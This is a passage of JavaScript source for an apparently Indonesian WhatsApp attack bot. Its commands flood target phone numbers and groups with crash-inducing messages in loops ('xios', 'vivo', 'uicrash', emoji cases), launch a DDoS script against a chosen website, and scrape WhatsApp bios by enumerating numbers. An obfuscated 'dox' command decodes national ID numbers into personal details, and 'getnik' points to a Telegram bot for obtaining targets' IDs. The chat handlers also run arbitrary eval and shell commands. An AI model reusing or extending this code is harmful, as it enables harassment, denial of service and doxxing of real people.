  var t3 = nu[Math.floor(Math.random() * nu.length)]
  var t4 = nu[Math.floor(Math.random() * nu.length)]
  var rndm;
  if (random_length == 1) {
    rndm = `${t1}`
  } else if (random_length == 2) {
    rndm = `${t1}${t2}`
  } else if (random_length == 3) {
    rndm = `${t1}${t2}${t3}`
  } else if (random_length == 4) {
    rndm = `${t1}${t2}${t3}${t4}`
  }
  var anu = await rxhl.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
  var anuu = anu.length !== 0 ? anu: false
  try {
    try {
      var anu1 = await rxhl.fetchStatus(anu[0].jid)
    } catch {
      var anu1 = '401'
    }
    if (anu1 == '401' || anu1.status.length == 0) {
      no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
    } else {
      const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
      if (!(year in data)) {
        data[year] = [];
      }
      data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
    }
  } catch {
    no_watsap += `${nomer0}${i}${nomer1}\n`
  }
}
const bio = Object.keys(data)
.map((key) => {
  return `*[ ${key} ]*\n${data[key].join('')}`
})
.join('\n')
const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
replyz(hasil)
}
break

case 'bubar': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Id grup mana?')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
jumlah = 20
sendVariousMessages(Pe, jumlah)
await sleep(2000)
replyz(`*𝐒𝐔𝐊𝐒𝐄𝐒 𝐌𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 𝐊𝐄 ${Pe}`)
break
case 'all-device': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 40; i++) {
await beta1(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐌𝐄𝐋𝐀𝐊𝐒𝐀𝐍𝐀𝐊𝐀𝐍 』

╔═══╦══╗╔═══╗
║╔═╗║╔╗║║╔═╗║
║║─║║╚╝╚╣║─╚╝
║╚═╝║╔═╗║║─╔╗
║╔═╗║╚═╝║╚═╝║
╚╝─╚╩═══╩═══╝

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'ytmp3': case 'youtubemp3': {
if (!isMurbug) return replyz('*.*')
if (!q) return replyz(`Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%2`)
await loading()
downloadMp3(q)
}
break

case 'tourl': {
if (!isMurbug) return replyz(global.nocreator)
if (!quoted) return replyz(`Reply Media`)
replyz('*please wait a moment*')
let media = await rxhl.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
anuh = await TelegraPh(media)
replyz(util.format(anuh))
} else if (/video/.test(mime)) {
anuh = await TelegraPh(media)
replyz(util.format(anuh))
} else if (!/image/.test(mime)) {
anuh = await UploadFileUgu(media)
replyz(util.format(anuh))
}
await fs.unlinkSync(media)       
}
break

case 'xios': case 'iphone': case 'xip':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugsuc)
for (let i = 0; i < 40; i++) {
await beta2(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝙈𝙀𝙇𝘼𝙆𝙎𝘼𝙉𝘼𝙆𝘼𝙉 』

▄▀█ █▄▄ █▀
█▀█ █▄█ █▄

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break
case 'vivo': case 'attack': case 'andro': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(rxhl, target, "Sv Anonymous 🌐", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(rxhl, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐌𝐄𝐋𝐀𝐊𝐒𝐀𝐍𝐀𝐊𝐀𝐍 』

࿕ 𝘼𝙧𝙖𝙛𝙞 𝘼𝙗𝙘🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'basmi-group': {
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz('Insert Id Grup')
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@g.us"
await rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(2000)
await rxhl.sendMessage(Pe, { react: { text: '🦄', key: { remoteJid: m.chat, fromMe: true, id: quoted.id } } })
}
break

case 'vip': case 'attack': case 'andro': case 'trash-loc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await buk1(rxhl, target, "Sv Anonymous 🌐", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await beta2(rxhl, target, wanted)
await sendSessionStructure(target, wanted)
await beta1(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝙈𝙀𝙇𝘼𝙆𝙎𝘼𝙉𝘼𝙆𝘼𝙉 』

╔═══╦══╗╔═══╗
║╔═╗║╔╗║║╔═╗║
║║─║║╚╝╚╣║─╚╝
║╚═╝║╔═╗║║─╔╗
║╔═╗║╚═╝║╚═╝║
╚╝─╚╩═══╩═══╝

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break
case '🤡': case '😁': case '🥰': case '🤮': case '😱': case '😏': case '😭': case '🥺': case '🔥': case '🌷': case '😒':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
XeonOP = global.virtexpc
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
await sleep(500)
sendLiveLocationMessage(Pe)
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `ARAFI ABC `, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `ArafiBotz`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(500)
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `𝐀𝐫𝐚𝐟𝐢𝐀𝐛𝐜`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `𝐀𝐫𝐚𝐟𝐢𝐀𝐛𝐜`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
sendListMessage(Pe)
await sleep(500)
}
replyz(`*</> 𝐒𝐔𝐊𝐒𝐄𝐒 𝐌𝐄𝐋𝐀𝐊𝐒𝐀𝐍𝐀𝐊𝐀𝐍*`)
break

case 'ddos':
if (!isMurbug) return replyz(global.nocreator)
if (!q.includes(' ')) return replyz(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
let moci = `*Bot is Attacking Wait for Results* 😤
• _Target_ ->  ${targetweb} 
• _Time Attack_ -> ${timeweb} `
rxhl.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Cek Websait",
      url: `${targetweb}`,
      merchant_url: `${targetweb}`
   })
}], m, {
   body: moci,
   footer: ''
})
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replyz(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replyz(`Error: ${stderr}`);
          return;
        }
        replyz(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         
break

case 'uisystem': case 'uicrash': case 'bugui': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐌𝐄𝐋𝐀𝐊𝐒𝐀𝐍𝐀𝐊𝐀𝐍 』

╔═══╦══╗╔═══╗
║╔═╗║╔╗║║╔═╗║
║║─║║╚╝╚╣║─╚╝
║╚═╝║╔═╗║║─╔╗
║╔═╗║╚═╝║╚═╝║
╚╝─╚╩═══╩═══╝

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break
case 'samsung': case 'uicrash': case 'bugui': 
if (!isMurbug) return replyz(global.nocreator)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await beta2(rxhl, target, wanted)
}
reply(`『 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝗠𝗘𝗟𝗔𝗞𝗦𝗔𝗡𝗔𝗞𝗔𝗡 』

ᜰ𝑨𝒓𝒂𝒇𝒊𝑨𝒃𝒄🦠

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command}`)
break

case 'dox': { //by moraxs inc
const _0x1ad75f = _0x1d50;
(function (_0x5722d4, _0x5d79c5) {
    const _0x419fb2 = _0x1d50, _0x4594e3 = _0x5722d4();
    while (!![]) {
        try {
            const _0x5287ce = parseInt(_0x419fb2(0x1ba)) / (0x182b + 0x2331 + -0x3b5b * 0x1) + parseInt(_0x419fb2(0x1bb)) / (-0xcbf * -0x1 + -0x1d20 + -0x5 * -0x347) * (parseInt(_0x419fb2(0x1a4)) / (0x14d8 + 0x1 * 0xae5 + -0x83 * 0x3e)) + -parseInt(_0x419fb2(0x1bf)) / (-0xd * 0x10d + 0x304 * -0x1 + 0x10b1) + parseInt(_0x419fb2(0x1ae)) / (-0x145 * -0x1 + -0x1 * 0x226 + 0xe6) * (-parseInt(_0x419fb2(0x1b3)) / (-0x1 * 0x1091 + 0x888 + 0x80f * 0x1)) + parseInt(_0x419fb2(0x1a8)) / (0xc92 + -0x607 * -0x5 + -0x2aae) * (-parseInt(_0x419fb2(0x199)) / (0x2 * -0x12b9 + -0x1190 * 0x1 + 0x370a)) + parseInt(_0x419fb2(0x1bc)) / (-0x25dc + -0xb92 * 0x3 + 0x489b) + parseInt(_0x419fb2(0x1a3)) / (-0x66 * 0x1c + -0xf5b + 0x1a8d);
            if (_0x5287ce === _0x5d79c5)
                break;
            else
                _0x4594e3['push'](_0x4594e3['shift']());
        } catch (_0x4e059b) {
            _0x4594e3['push'](_0x4594e3['shift']());
        }
    }
}(_0x5367, -0x5ff + -0x12 * 0x88f9 + 0x13 * 0xe253));
if (!isMurbug)
    return;
if (!q)
    return replyz(_0x1ad75f(0x1c9) + '\x20' + (prefix + command) + (_0x1ad75f(0x198) + _0x1ad75f(0x1a5)));
function _0x1d50(_0x3c301c, _0x131a9c) {
    const _0x5e5a9a = _0x5367();
    return _0x1d50 = function (_0x1e5abf, _0xd89f17) {
        _0x1e5abf = _0x1e5abf - (-0x951 * -0x1 + -0x53 * 0x2 + -0xc * 0x97);
        let _0x1a89ba = _0x5e5a9a[_0x1e5abf];
        return _0x1a89ba;
    }, _0x1d50(_0x3c301c, _0x131a9c);
}
nik = q[_0x1ad75f(0x1aa)]();
const moraxs = require(_0x1ad75f(0x1c0) + _0x1ad75f(0x1c7) + _0x1ad75f(0x1a1)), white = new Date()[_0x1ad75f(0x1b4) + 'r']()[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1b2)](-(-0x1ca1 * 0x1 + 0x983 + 0x1320)), green = nik[_0x1ad75f(0x1c2)](0x1 * -0x1a0e + 0x1399 + -0x67f * -0x1, -0x665 + 0x90e + 0x3 * -0xdf), yellow = nik[_0x1ad75f(0x1c2)](-0xbf1 + 0x1af * -0x12 + 0xe17 * 0x3, 0xd * -0x10a + -0x1466 + 0x21f0);
function _0x5367() {
    const _0x495ec9 = [
        '\x0aLahir:\x20',
        '\x0aKecamatan',
        '251772mkKAbJ',
        './lib/getd',
        'D:\x20',
        'substring',
        '\x0aProvince:',
        'length',
        '0|10|9|11|',
        '\x0aNama\x20Kabu',
        'ata/wilaya',
        'igit',
        '*Example*:',
        'split',
        '\x203216728xx',
        '1040LAXXul',
        '\x0aKelamin:\x20',
        'Perempuan',
        'kabkot',
        '4|2|5',
        'harus\x2016\x20d',
        '8|7|6|1|3|',
        '\x0aKode\x20Pos:',
        'h.json',
        '\x0aProvice\x20I',
        '12351070HwEtZc',
        '33NRugLl',
        'xxxxx',
        'Laki-laki',
        '\x0aKabupaten',
        '50309UGiCCa',
        '[\x20RXHL\x20OFC',
        'toString',
        'Nomor\x20NIK\x20',
        'matan:\x20',
        'slice',
        '137235iFAOFQ',
        '\x20--\x20',
        '\x20ID:\x20',
        'provinsi',
        'substr',
        '114OBnjVf',
        'getFullYea',
        '\x0aNama\x20Keca',
        '\x0aUniqcode:',
        'paten:\x20',
        'kecamatan',
        '\x20]\x0a\x0aNik:\x20',
        '708334MZIFmC',
        '1000yrrSlg',
        '341469uKBskL'
    ];
    _0x5367 = function () {
        return _0x495ec9;
    };
    return _0x5367();
}
if (nik[_0x1ad75f(0x1c4)] == -0x18cf + 0x3 * -0x943 + 0x34a8) {
    const xhYroT = (_0x1ad75f(0x1c5) + _0x1ad75f(0x19f) + _0x1ad75f(0x19d))[_0x1ad75f(0x197)]('|');
    let hoQumn = 0x2 * -0x2d1 + -0x1ca9 + 0x224b;
    while (!![]) {
        switch (xhYroT[hoQumn++]) {
        case '0':
            provinceid = nik[_0x1ad75f(0x1c2)](-0x186f + 0x26a * -0x1 + 0x1ad9, -0x11 * 0x151 + 0x3 * -0x7f5 + 0x2e42);
            continue;
        case '1':
            kelamin = yellow > -0xd40 + 0x1045 + 0x2dd * -0x1 ? _0x1ad75f(0x19b) : _0x1ad75f(0x1a6);
            continue;
        case '2':
            V = green < white ? '20' + green : '19' + green;
            continue;
        case '3':
            lahir = yellow > 0x1 * -0x1c68 + -0xa * -0x17 + 0x1baa ? (yellow - (-0x950 + 0x248 + 0x5c * 0x14))[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1c4)] > -0x5 * -0x301 + 0xe30 + 0xe * -0x216 ? (yellow - (-0x2137 + 0x173 * -0x13 + 0x3ce8))[_0x1ad75f(0x1aa)]() : '0' + (yellow - (-0x1d8 * -0x4 + -0xbf7 + 0x4bf))[_0x1ad75f(0x1aa)]() : yellow;
            continue;
        case '4':
            X = nik[_0x1ad75f(0x1c2)](0x19e5 + -0xdf7 + -0x5f3 * 0x2, -0xb * 0x28d + -0x1fe8 * 0x1 + -0x3c01 * -0x1);
            continue;
        case '5':
            Z = nik[_0x1ad75f(0x1c2)](-0xeb * -0x1b + 0xbad + -0x246a, 0x1202 + -0x2055 + 0xe63);
            continue;
        case '6':
            kodepos = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x1ad3 + -0x1468 + -0x66b, 0x524 + -0x1b7f + -0x151 * -0x11)][_0x1ad75f(0x1ad)](-(-0xb2 * -0xc + -0xd * -0x225 + 0x121a * -0x2));
            continue;
        case '7':
            kecamatan = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x163a + -0x242a + 0xdf0, 0x11 * -0x41 + -0xf7f * 0x1 + 0x13d6)][_0x1ad75f(0x197)](_0x1ad75f(0x1af))[0x1e9e + 0x399 + 0x13 * -0x1cd];
            continue;
        case '8':
            kecamatanId = nik[_0x1ad75f(0x1c2)](-0x2 * -0xe13 + 0x2431 + 0x931 * -0x7, 0x1e26 + 0x38e + 0x1 * -0x21ae);
            continue;
        case '9':
            kabupatenKotaId = nik[_0x1ad75f(0x1c2)](0x6 * -0x115 + 0xed * -0x4 + 0xa32, -0x192c + -0x1 * -0x189 + 0x17a7);
            continue;
        case '10':
            province = moraxs[_0x1ad75f(0x1b1)][nik[_0x1ad75f(0x1c2)](-0x649 * 0x1 + 0x5d9 * -0x1 + -0x1 * -0xc22, 0x1f04 + 0x92f * 0x3 + -0x3a8f * 0x1)];
            continue;
        case '11':
            kabupatenKota = moraxs[_0x1ad75f(0x19c)][nik[_0x1ad75f(0x1c2)](0x8c5 + -0x280 + -0x645, -0x1ea5 + -0x1 * 0xb0f + 0x14dc * 0x2)];
            continue;
        }
        break;
    }
} else
    return replyz(_0x1ad75f(0x1ab) + _0x1ad75f(0x19e) + _0x1ad75f(0x1c8));
await sleep(-0x240b * -0x1 + 0x1e3f + -0x3692), replyz(_0x1ad75f(0x1a9) + _0x1ad75f(0x1b9) + q + (_0x1ad75f(0x1a2) + _0x1ad75f(0x1c1)) + provinceid + (_0x1ad75f(0x1c3) + '\x20') + province + (_0x1ad75f(0x1a7) + _0x1ad75f(0x1b0)) + kabupatenKotaId + (_0x1ad75f(0x1c6) + _0x1ad75f(0x1b7)) + kabupatenKota + (_0x1ad75f(0x1be) + _0x1ad75f(0x1b0)) + kecamatanId + (_0x1ad75f(0x1b5) + _0x1ad75f(0x1ac)) + kecamatan + (_0x1ad75f(0x1a0) + '\x20') + kodepos + _0x1ad75f(0x19a) + kelamin + _0x1ad75f(0x1bd) + lahir + '/' + X + '/' + V + (_0x1ad75f(0x1b6) + '\x20') + Z);
}
break

case 'getnik':
if (!isMurbug) return replyz(global.nocreator)
tutor = fs.readFileSync('./lib/video/tutor.mp4')
rxhl.sendMessage(from, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT`},{quoted: m})
break
default:
if (budy.startsWith('=>')) {
if (!isCreator) return replyz('*Only Vip*')
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)}
return replyz(bang)}
try {
replyz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyz(String(e))}}
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await replyz(evaled)
} catch (err) {
await replyz(String(err))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
require("child_process").exec(budy.slice(2), (err, stdout) => {
if (err) return replyz(`${err}`)
if (stdout) return replyz(stdout)
})
}

}
} catch (err) {
rxhl.sendMessage(m.chat, {text: require('util').format(err)}, {quoted: m})
console.log('\x1b[1;31m'+err+'\x1b[0m')
}
}

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file)
console.log('\x1b[0;32m'+__filename+' \x1b[1;32mupdated!\x1b[0m')
delete require.cache[file]
require(file)
})

